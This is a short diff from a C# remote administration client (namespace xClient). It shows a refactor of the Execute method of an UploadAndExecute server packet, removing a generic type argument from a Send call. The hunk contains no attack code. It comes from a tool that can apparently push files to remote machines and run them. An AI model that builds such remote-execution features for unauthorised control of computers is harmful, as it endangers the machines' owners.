@@ -39,7 +39,7 @@ namespace xClient.Core.Packets.ServerPackets
 
         public void Execute(Client client)
         {
-            client.Send<UploadAndExecute>(this);
+            client.Send(this);
         }
     }
 }
